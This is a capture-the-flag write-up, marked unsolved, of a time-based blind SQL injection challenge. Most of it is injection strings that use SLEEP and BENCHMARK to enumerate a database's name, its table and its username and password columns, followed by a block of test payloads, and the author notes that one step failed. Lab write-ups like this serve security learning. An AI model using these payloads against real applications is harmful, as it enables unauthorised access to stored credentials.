# Not Just SQL (Unsolved)

**Date:** 04, July, 2021

**Author:** Dhilip Sanjay S

---

- There have been a breakthrough in our heist but we still cant access `chall2.hackingbrawl.com` as a privileged user.

### Database is the hell
- **Hint:** I am blind folded
- **Steps to Reproduce:** 
    - Use python script
    - To find the database: `1' and (select sleep(10) from dual where database() like '%')-- `
        - Database name: `hack`
    - To find the table name: `1' and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')-- `
        - Table name: `tab`
    - To find the column count:
        - `1' and (select sleep(10) from dual where (select count(column_name) from information_schema.columns where table_schema=database() and table_name like 'tab%' limit 0,1) like '%')-- `
    - To find the column names:
        - `1' and (select sleep(10) from dual where (select column_name from information_schema.columns where table_schema=database() and table_name like 'tab%' limit 0,1) like '%')-- `
            - username
            - password
    - To find the username: (Didn't work!)
        - `1' and (select sleep(10) from dual where (select username from tab limit 0,1) like '%')-- `


## Testing Payloads

```sql
select count(*) from table_name where table_name = (select table_name from information_schema.columns where table_schema=database() and table_name like 'user%');

' AND (SELECT (CASE WHEN EXISTS(SELECT username FROM tab WHERE username REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); --

1' AND (SELECT (CASE WHEN EXISTS(SELECT username FROM tab WHERE username LIKE '%') THEN SLEEP(3) ELSE SLEEP(10) END)); --

1' UNION SELECT IF(SUBSTRING(password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM tab WHERE username LIKE '%'-- 
```

---